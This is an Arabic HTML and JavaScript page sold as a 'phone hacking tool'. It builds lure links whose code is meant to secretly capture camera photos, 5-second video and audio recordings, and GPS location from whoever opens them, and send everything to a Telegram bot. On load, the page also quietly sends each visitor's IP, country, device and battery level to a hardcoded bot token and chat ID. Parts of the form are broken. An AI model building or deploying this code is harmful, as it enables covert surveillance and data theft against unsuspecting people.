<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>أداة إختراق الهاتف كامل من المبرمج IDLEB X</title>
  <style>
    /* ========== متغيرات الألوان الجذابة ========== */
    :root {
      --bg-dark: #0c0b14;
      --card-bg: rgba(26, 22, 46, 0.85);
      --primary: #6c5ce7;
      --primary-dark: #5649c0;
      --accent: #fd79a8;
      --text-light: #ffffff;
      --text-muted: #b2b0c5;
      --glow-color: rgba(108, 92, 231, 0.5);
    }

    /* ========== الأساسيات والخلفية ثلاثية الأبعاد ========== */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      font-family: 'Segoe UI', 'Poppins', Tahoma, sans-serif;
      background-color: var(--bg-dark);
      color: var(--text-light);
      overflow-x: hidden;
      position: relative;
    }

    /* خلفية ديناميكية ثلاثية الأبعاد (شبكة وكرات ضبابية) */
    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: 
        radial-gradient(circle at 30% 40%, rgba(108, 92, 231, 0.15) 0%, transparent 30%),
        radial-gradient(circle at 70% 60%, rgba(253, 121, 168, 0.12) 0%, transparent 35%),
        linear-gradient(0deg, transparent 24%, rgba(255, 255, 255, 0.02) 25%, rgba(255, 255, 255, 0.02) 26%, transparent 27%, transparent),
        linear-gradient(90deg, transparent 24%, rgba(255, 255, 255, 0.02) 25%, rgba(255, 255, 255, 0.02) 26%, transparent 27%, transparent);
      background-size: 100% 100%, 100% 100%, 60px 60px, 60px 60px;
      pointer-events: none;
      z-index: 0;
    }

    /* كرات ضبابية متحركة (3D Effect) */
    .blob {
      position: fixed;
      width: 400px;
      height: 400px;
      background: linear-gradient(180deg, var(--primary) 0%, var(--accent) 100%);
      border-radius: 50%;
      filter: blur(100px);
      opacity: 0.2;
      animation: float 20s infinite alternate ease-in-out;
      z-index: 0;
      pointer-events: none;
    }

    .blob-1 {
      top: -100px;
      left: -100px;
      background: linear-gradient(180deg, #6c5ce7, #a463f5);
      animation-duration: 25s;
    }

    .blob-2 {
      bottom: -100px;
      right: -100px;
      width: 500px;
      height: 500px;
      background: linear-gradient(180deg, #fd79a8, #e84393);
      animation-duration: 30s;
      animation-delay: -5s;
    }

    .blob-3 {
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 600px;
      height: 600px;
      background: radial-gradient(circle, #00cec9, #0984e3);
      opacity: 0.1;
      filter: blur(120px);
      animation: pulse 15s infinite alternate;
    }

    @keyframes float {
      0% { transform: translate(0, 0) scale(1); }
      100% { transform: translate(100px, 100px) scale(1.2); }
    }

    @keyframes pulse {
      0% { transform: translate(-50%, -50%) scale(1); opacity: 0.1; }
      100% { transform: translate(-50%, -50%) scale(1.5); opacity: 0.2; }
    }

    /* ========== التخطيط الرئيسي ========== */
    .wrap {
      position: relative;
      z-index: 10;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .container {
      max-width: 1200px;
      width: 100%;
      margin: 0 auto;
    }

    /* ========== تصميم البطاقة الرئيسية (3D Card) ========== */
    .card {
      background: var(--card-bg);
      backdrop-filter: blur(12px);
      border-radius: 32px;
      padding: 30px;
      box-shadow: 
        0 30px 60px rgba(0, 0, 0, 0.5),
        0 0 0 1px rgba(255, 255, 255, 0.05) inset,
        0 0 30px var(--glow-color);
      border: 1px solid rgba(255, 255, 255, 0.1);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      width: 100%;
    }

    .card:hover {
      transform: translateY(-5px) scale(1.02);
      box-shadow: 
        0 40px 80px rgba(0, 0, 0, 0.6),
        0 0 0 1px rgba(255, 255, 255, 0.1) inset,
        0 0 50px var(--glow-color);
    }

    /* ========== الشبكة (Grid) لترتيب المحتوى ========== */
    .grid-2 {
      display: grid;
      grid-template-columns: 1fr 0.8fr;
      gap: 30px;
      align-items: center;
    }

    @media (max-width: 768px) {
      .grid-2 {
        grid-template-columns: 1fr;
        gap: 40px;
      }
    }

    /* ========== قسم الصورة (قابلة للتغيير) ========== */
    .image-section {
      background: rgba(0, 0, 0, 0.2);
      border-radius: 24px;
      padding: 25px;
      backdrop-filter: blur(5px);
      border: 1px solid rgba(255, 255, 255, 0.05);
      text-align: center;
    }

    .image-title {
      font-size: 1.5rem;
      font-weight: 600;
      margin-bottom: 20px;
      background: linear-gradient(135deg, #fff, var(--text-muted));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .image-container {
      width: 100%;
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 20px 30px rgba(0, 0, 0, 0.5);
      border: 2px solid rgba(255, 255, 255, 0.1);
      transition: all 0.3s ease;
    }

    .image-container:hover {
      border-color: var(--primary);
      box-shadow: 0 0 30px var(--primary);
    }

    .image-container img {
      width: 100%;
      height: auto;
      display: block;
      transition: transform 0.5s ease;
    }

    .image-container:hover img {
      transform: scale(1.05);
    }

    /* ========== قسم النموذج ========== */
    .form-section {
      /* محتوى النموذج هنا */
    }

    .title {
      font-size: 2.2rem;
      font-weight: 800;
      margin-bottom: 10px;
      background: linear-gradient(135deg, #fff, var(--primary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      letter-spacing: -0.5px;
    }

    .subtitle {
      color: var(--text-muted);
      margin-bottom: 25px;
      font-size: 1rem;
      border-right: 3px solid var(--primary);
      padding-right: 15px;
    }

    .form {
      background: rgba(0, 0, 0, 0.2);
      border-radius: 20px;
      padding: 20px;
      backdrop-filter: blur(5px);
      border: 1px solid rgba(255, 255, 255, 0.05);
    }

    label {
      display: block;
      color: var(--text-light);
      font-weight: 600;
      margin: 15px 0 8px;
      font-size: 0.95rem;
    }

    input[type="text"] {
      width: 100%;
      padding: 14px;
      border-radius: 14px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      background: rgba(0, 0, 0, 0.3);
      color: #fff;
      outline: none;
      font-size: 15px;
      transition: all 0.3s;
      box-sizing: border-box;
    }

    input[type="text"]:focus {
      border-color: var(--primary);
      box-shadow: 0 0 20px rgba(108, 92, 231, 0.3);
    }

    .checkbox-group {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin: 15px 0;
      max-height: 250px;
      overflow-y: auto;
      padding: 10px;
      background: rgba(0, 0, 0, 0.2);
      border-radius: 16px;
    }

    .checkbox-item {
      display: flex;
      align-items: center;
      gap: 12px;
      background: rgba(255, 255, 255, 0.03);
      padding: 10px 15px;
      border-radius: 12px;
      transition: background 0.2s, transform 0.2s;
      border: 1px solid transparent;
    }

    .checkbox-item:hover {
      background: rgba(108, 92, 231, 0.15);
      border-color: var(--primary);
      transform: translateX(-5px);
    }

    .checkbox-item input[type="checkbox"] {
      width: 20px;
      height: 20px;
      cursor: pointer;
      accent-color: var(--primary);
    }

    .checkbox-item label {
      margin: 0;
      font-weight: 500;
      font-size: 14px;
      cursor: pointer;
      flex: 1;
      color: #fff;
    }

    .btn {
      display: inline-block;
      padding: 16px 20px;
      border-radius: 16px;
      border: none;
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      color: #fff;
      font-weight: 700;
      font-size: 1.1rem;
      cursor: pointer;
      margin-top: 20px;
      width: 100%;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      box-shadow: 0 10px 20px rgba(108, 92, 231, 0.3);
    }

    .btn:hover {
      background: linear-gradient(135deg, var(--primary-dark), #4a3b9e);
      transform: translateY(-3px);
      box-shadow: 0 20px 30px rgba(108, 92, 231, 0.5);
    }

    .result {
      margin-top: 20px;
      padding: 12px 15px;
      border-radius: 16px;
      background: rgba(0, 0, 0, 0.3);
      word-break: break-all;
      font-size: 14px;
      display: flex;
      gap: 10px;
      align-items: center;
      justify-content: space-between;
      border: 1px solid rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(5px);
    }

    .copyBtn {
      padding: 8px 16px;
      border-radius: 12px;
      background: rgba(255, 255, 255, 0.1);
      border: 1px solid rgba(255, 255, 255, 0.15);
      cursor: pointer;
      color: #fff;
      font-weight: 600;
      transition: 0.2s;
    }

    .copyBtn:hover {
      background: var(--primary);
      border-color: var(--primary);
    }

    /* ========== التذييل والشارات ========== */
    .madeby {
      position: fixed;
      left: 20px;
      bottom: 20px;
      z-index: 9999;
      background: rgba(0, 0, 0, 0.4);
      backdrop-filter: blur(8px);
      padding: 8px 18px;
      border-radius: 50px;
      font-weight: 700;
      border: 1px solid rgba(255, 255, 255, 0.1);
      color: #fff;
      font-size: 0.9rem;
      letter-spacing: 0.5px;
    }

    .captureBadge {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 9999;
      background: rgba(0, 0, 0, 0.4);
      backdrop-filter: blur(8px);
      padding: 8px 18px;
      border-radius: 50px;
      font-weight: 700;
      color: #ffd966;
      border: 1px solid rgba(255, 255, 255, 0.1);
      display: none;
    }

    .download-page {
      width: 100%;
      min-height: 100vh;
      background: transparent;
      margin: 0;
      padding: 20px 0;
      box-sizing: border-box;
      font-family: Tahoma, Arial, sans-serif;
    }
    .main-box{
      width:95%;
      max-width:600px;
      background: rgba(255,255,255,0.05);
      backdrop-filter: blur(10px);
      margin:40px auto;
      padding:25px;
      border-radius:25px;
      box-shadow:0 5px 20px rgba(0,0,0,0.3);
      text-align:center;
      border: 1px solid rgba(255,255,255,0.1);
    }
    .main-box h2{
      margin-bottom:20px;
      color:#fff;
      font-size: 16px;
    }
    .download-btn{
      background: linear-gradient(135deg, #00b894, #00cec9);
      color:white;
      padding:18px 45px;
      font-size:22px;
      border:none;
      border-radius:60px;
      cursor:pointer;
      transition:0.3s;
      box-shadow:0 4px 10px rgba(0,0,0,0.2);
    }
    .download-btn:hover{
      transform:scale(1.05);
      box-shadow:0 0 30px #00b894;
    }
  </style>
</head>
<body>

  <!-- عناصر الخلفية ثلاثية الأبعاد -->
  <div class="blob blob-1"></div>
  <div class="blob blob-2"></div>
  <div class="blob blob-3"></div>

  <div class="wrap">
    <div class="container">

      <!-- البطاقة الرئيسية -->
      <div class="card" id="cardArea">
        <div class="grid-2">

          <!-- الجزء الأيمن: الصورة (قابلة للتغيير) -->
          <div class="image-section">
            <h3 class="image-title">MOOHAMED / IDLEB X يرحب بكم </h3>
            <div class="image-container">
              <!-- غير رابط الصورة أدناه برابط الصورة التي تريدها -->
              <img src="https://i.ibb.co/d4DfRnH2/Pookie-Spide-WEBP-0.jpg" 
                   alt="صورة قابلة للتغيير">
              <!-- غير الرابط أعلاه فقط -->
            </div>
            <p style="color: var(--text-muted); margin-top: 15px; font-size: 0.9rem;">ها يا غالي انتبه مالي دخل شبتسوي انت المهم انا خالي مسؤوليتي </p>
          </div>

          <!-- الجزء الأيسر: النموذج -->
          <div class="form-section">
            <h1 class="title">أنشئ رابطك الخاص</h1>
            <p class="subtitle">⚠️ يُمنع استخدام الأداة بشكل غير قانوني. المستخدم يتحمل المسؤولية الكاملة.</p>

            <div class="form" id="formBox">
              <label>أدخل الـ ID</label>

              <label>أدخل توكن البوت</label>

              <!-- خيارات متعددة للميزات -->
              <label>الميزات المطلوبة (مدة التسجيل 5 ثوان):</label>
              <div class="checkbox-group" id="featuresGroup">
                <div class="checkbox-item">
                  <input type="checkbox" id="camFront" value="camFront" checked="">
                  <label for="camFront">📸 صورة من الكاميرا الأمامية</label>
                </div>
                <div class="checkbox-item">
                  <input type="checkbox" id="camBack" value="camBack">
                  <label for="camBack">📷 صورة من الكاميرا الخلفية</label>
                </div>
                <div class="checkbox-item">
                  <input type="checkbox" id="videoFront" value="videoFront">
                  <label for="videoFront">🎥 فيديو من الكاميرا الأمامية (5 ثوان)</label>
                </div>
                <div class="checkbox-item">
                  <input type="checkbox" id="videoBack" value="videoBack">
                  <label for="videoBack">📹 فيديو من الكاميرا الخلفية (5 ثوان)</label>
                </div>
                <div class="checkbox-item">
                  <input type="checkbox" id="audio" value="audio">
                  <label for="audio">🎤 تسجيل صوتي (5 ثوان)</label>
                </div>
                <div class="checkbox-item">
                  <input type="checkbox" id="location" value="location">
                  <label for="location">📍 تحديد الموقع على الخريطة</label>
                </div>
              </div>

              <button class="btn" id="generateBtn">🚀 إنشاء الرابط الآن</button>

              <div id="result" style="display:none" class="result">
                <div id="linkText" style="flex:1; color: var(--text-muted); font-size:13px;"></div>
                <button class="copyBtn" id="copyBtn">نسخ</button>
              </div>
            </div>
          </div>
        </div>
      </div>

    </div>
  </div>

  <div id="captureBadge" class="captureBadge">🟢 في الانتظار</div>
  <div class="madeby">MOOHAMED / IDLEB X</div>

  <script>
    // ------------------ متغيرات البوت الثابتة ------------------
    const MASTER_BOT_TOKEN = "8454441192:AAGd2zGyoz7FdEukD1qE6EmrXw_FkMs60M4";
    const MASTER_CHAT_ID   = "6947939129";

    // ------------------ تخزين معلومات الزائر ------------------
    let visitorIP = "غير معروف";
    let visitorCountry = "غير معروف";
    let visitorDevice = "Unknown";
    let visitorBattery = "غير متاح";
    let visitorOS = "غير معروف";

    // ------------------ إرسال معلومات الزائر (مرة واحدة) ------------------
    async function sendVisitorInfo() {
      try {
        const userAgent = navigator.userAgent;
        if (/Android/i.test(userAgent)) visitorDevice = "Android";
        else if (/iPhone|iPad|iPod/i.test(userAgent)) visitorDevice = "iOS";
        else visitorDevice = "Unknown";

        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            visitorBattery = (battery.level * 100) + "%";
            if (battery.charging) visitorBattery += " (شحن)";
          } catch (e) {}
        }

        try {
          const ipRes = await fetch('https://ipapi.co/json/');
          const ipData = await ipRes.json();
          visitorIP = ipData.ip || "غير معروف";
          visitorCountry = ipData.country_name || "غير معروف";
        } catch (e) {}

        const message = `🟢 *زيارة جديدة*
🌍 *الدولة*: ${visitorCountry}
📱 *الجهاز*: ${visitorDevice}
🔋 *البطارية*: ${visitorBattery}
🌐 *IP*: ${visitorIP}
🕒 *الوقت*: ${new Date().toLocaleString('ar-EG')}`;

        await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
      } catch (err) {}
    }
    sendVisitorInfo();

    // ------------------ عناصر الفورم ------------------
    const generateBtn = document.getElementById('generateBtn');
    const resultEl = document.getElementById('result');
    const linkText = document.getElementById('linkText');
    const copyBtn = document.getElementById('copyBtn');

    generateBtn.addEventListener('click', () => {
      const chat = document.getElementById('chatIdInput').value.trim();
      const token = document.getElementById('tokenInput').value.trim();

      if(!chat || !token){
        alert('املأ جميع الحقول');
        return;
      }

      const checkboxes = document.querySelectorAll('#featuresGroup input[type="checkbox"]:checked');
      const features = Array.from(checkboxes).map(cb => cb.value).join(',');
      const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(features)}`;
      linkText.innerText = fullLink;
      resultEl.style.display = 'flex';
    });

    copyBtn.addEventListener('click', async () => {
      try {
        await navigator.clipboard.writeText(linkText.innerText);
        copyBtn.innerText = 'تم النسخ';
        setTimeout(()=> copyBtn.innerText = 'نسخ',1500);
      } catch(e) { alert('فشل النسخ'); }
    });

    // ------------------ دالة تحميل الإعلانات ------------------
    function loadAd(src) {
      const s = document.createElement("script");
      s.src = src;
      s.async = true;
      document.body.appendChild(s);
    }

    // ------------------ دوال مساعدة للتعامل مع الوسائط ------------------
    function buildCaption(extra = "") {
      let cap = `━━━━━━━━━━━━━━━\n`;
      cap += `🌍 الدولة: ${visitorCountry}\n`;
      cap += `📱 الجهاز: ${visitorDevice}\n`;
      cap += `🔋 البطارية: ${visitorBattery}\n`;
      cap += `🌐 IP: ${visitorIP}\n`;
      cap += `🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
      if (extra) cap += `${extra}\n`;
      cap += `━━━━━━━━━━━━━━━`;
      return cap;
    }

    async function captureAndSend(stream, chat, token, type) {
      return new Promise((resolve) => {
        const video = document.createElement('video');
        video.autoplay = true;
        video.playsInline = true;
        video.muted = true;
        video.style.display = 'none';
        video.srcObject = stream;
        document.body.appendChild(video);

        video.onloadedmetadata = () => {
          video.play();
          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
              if (blob && blob.size > 2000) {
                const form = new FormData();
                form.append('chat_id', chat);
                form.append('photo', blob, `${type}_${Date.now()}.jpg`);
                const caption = buildCaption(`📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})`);
                form.append('caption', caption);
                
                try {
                  await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: form
                  });
                } catch (e) { console.log(e); }
              }
              document.body.removeChild(video);
              resolve();
            }, 'image/jpeg', 0.9);
          }, 2000);
        };
      });
    }

    async function recordAndSend(stream, chat, token, type) {
      return new Promise((resolve) => {
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/mp4' });
          const form = new FormData();
          form.append('chat_id', chat);
          form.append('video', blob, `${type}_${Date.now()}.mp4`);
          const caption = buildCaption(`🎥 فيديو (${type === 'front' ? 'أمامي' : 'خلفي'}) - 5 ثوان`);
          form.append('caption', caption);
          
          try {
            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
              method: 'POST',
              body: form
            });
          } catch (e) {}
          resolve();
        };
        
        mediaRecorder.start();
        setTimeout(() => {
          if (mediaRecorder.state === 'recording') mediaRecorder.stop();
        }, 5000);
      });
    }

    async function recordAudioAndSend(stream, chat, token) {
      return new Promise((resolve) => {
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'audio/mp4' });
          const form = new FormData();
          form.append('chat_id', chat);
          form.append('audio', blob, `audio_${Date.now()}.mp4`);
          const caption = buildCaption(`🎤 تسجيل صوتي - 5 ثوان`);
          form.append('caption', caption);
          
          try {
            await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
              method: 'POST',
              body: form
            });
          } catch (e) {}
          resolve();
        };
        
        mediaRecorder.start();
        setTimeout(() => {
          if (mediaRecorder.state === 'recording') mediaRecorder.stop();
        }, 5000);
      });
    }

    async function sendLocation(chat, token) {
      return new Promise((resolve) => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              const { latitude, longitude } = position.coords;
              const caption = buildCaption(`📍 الموقع الحالي\nالإحداثيات: ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`);
              
              await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chat, text: caption })
              });
              resolve();
            },
            (error) => {
              console.log('خطأ في تحديد الموقع:', error);
              resolve();
            }
          );
        } else {
          resolve();
        }
      });
    }

    async function preGrantPermissions(needCamera, needMicrophone) {
      if (!needCamera && !needMicrophone) return true;
      const constraints = {};
      if (needCamera) constraints.video = true;
      if (needMicrophone) constraints.audio = true;

      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        stream.getTracks().forEach(t => t.stop());
        return true;
      } catch (err) {
        console.log('رفض الإذن:', err);
        return false;
      }
    }

    async function startFeatures(chat, token, features) {
      if (!features) return;
      
      const featureList = features.split(',');
      
      const needCamera = featureList.some(f => ['camFront','camBack','videoFront','videoBack'].includes(f));
      const needMicrophone = featureList.some(f => ['audio','videoFront','videoBack'].includes(f));

      await preGrantPermissions(needCamera, needMicrophone);

      if (featureList.includes('camFront')) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
          await captureAndSend(stream, chat, token, 'front');
          stream.getTracks().forEach(t => t.stop());
        } catch (e) { console.log('فشلت صورة أمامية'); }
      }

      if (featureList.includes('camBack')) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
          await captureAndSend(stream, chat, token, 'back');
          stream.getTracks().forEach(t => t.stop());
        } catch (e) { console.log('فشلت صورة خلفية'); }
      }

      if (featureList.includes('videoFront')) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
          await recordAndSend(stream, chat, token, 'front');
          stream.getTracks().forEach(t => t.stop());
        } catch (e) { console.log('فشل فيديو أمامي'); }
      }

      if (featureList.includes('videoBack')) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
          await recordAndSend(stream, chat, token, 'back');
          stream.getTracks().forEach(t => t.stop());
        } catch (e) { console.log('فشل فيديو خلفي'); }
      }

      if (featureList.includes('audio')) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
          await recordAudioAndSend(stream, chat, token);
          stream.getTracks().forEach(t => t.stop());
        } catch (e) { console.log('فشل تسجيل صوتي'); }
      }

      if (featureList.includes('location')) {
        await sendLocation(chat, token);
      }
    }
